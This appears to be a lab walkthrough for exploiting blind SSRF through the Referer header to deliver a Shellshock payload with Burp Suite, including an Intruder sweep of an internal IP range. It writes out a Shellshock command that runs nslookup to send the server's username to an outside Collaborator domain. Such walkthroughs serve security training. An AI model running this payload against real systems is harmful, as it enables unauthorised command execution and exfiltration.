## Description

# Description

Blind SSRF can be exploited  by an attacker to trigger out of band response from the application server . An attacker will then exploit this to place the shell and send it to the server.

# Instructions

1. Install *Collaborator Everywhere* extension from the burp suite's *BApp Store. *

*Note : Use Burp Suite Professional for this attack.*

2. With burp intercept off , browse the application and observe that all requests are logged in the burp.  Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.

3. Send the product page request to the burp intruder.

4.Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net

5. change the Referer header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click "Add §".

6.Change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively. Click "Start attack". Once the attack is done go to collaborator window and click on *poll now*

7.Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
